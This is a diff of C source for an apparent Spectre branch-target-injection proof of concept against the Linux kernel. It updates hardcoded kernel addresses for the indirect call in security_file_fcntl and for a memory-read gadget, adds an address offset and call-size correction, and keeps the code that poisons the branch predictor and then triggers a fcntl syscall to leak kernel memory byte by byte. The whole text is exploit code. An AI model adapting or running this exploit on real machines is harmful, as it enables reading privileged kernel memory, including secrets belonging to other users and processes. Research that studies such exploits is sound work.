@@ -28,16 +28,19 @@ extern uint8_t btb_gadget;
 #define CACHE_ELEMS (256)
 #define CACHE_ELEM_SIZE (4096)
 
-// jmpq in security_file_fcntl
-#define CALL_ADDR   ((0xffffffff81234733ULL) & 0x000000ffffffffff)
-// proximal mov 8(%rdx) gadget
-#define GADGET_ADDR ((0xffffffff8123663dULL) & 0x000000ffffffffff)
-#define GADGET_RDX_OFFSET (8)
+// Addr of next inst after the target callq in security_file_fcntl
+#define CALL_ADDR_NEXT_INST ((0x11a00000ULL + 0xffffffff8138fcf3ULL) & 0x000000ffffffffff)
+// Proximal mov (%rdx) gadget
+#define GADGET_ADDR ((0x11a00000ULL + 0xffffffff81392126ULL) & 0x000000ffffffffff)
+#define GADGET_RDX_OFFSET (0)
 
 #define MIN_VARIANCE_MULT (3)
 #define BYTE_READ_ATTEMPTS (10000)
 #define BYTE_CONFIDENCE_THRESH (3)
 #define ZERO_CONFIDENCE_THRESH (100)
+
+#define CALLQ_SIZE (2)
+#define CALL_ADDR (CALL_ADDR_NEXT_INST - CALLQ_SIZE)
 
 
 typedef void (call_addr_func_t)(void *ptr);
@@ -104,7 +107,7 @@ bool measure_memory_byte_once(uint8_t *ptr, uint8_t *out_byte)
     evict_our_buffer();
 
     // Perform Spectre branch target injection once 
-    ((call_addr_func_t *)(CALL_ADDR))((void *)GADGET_ADDR);
+    ((call_addr_func_t *)(CALL_ADDR))((void *)(GADGET_ADDR));
     // Trigger the indirect jmp security_ops->file_fcntl(file, cmd, arg), hoping that security_ops is uncached
     syscall(__NR_fcntl, fcntl_fd, 0, ((uint64_t)ptr) - GADGET_RDX_OFFSET);
 
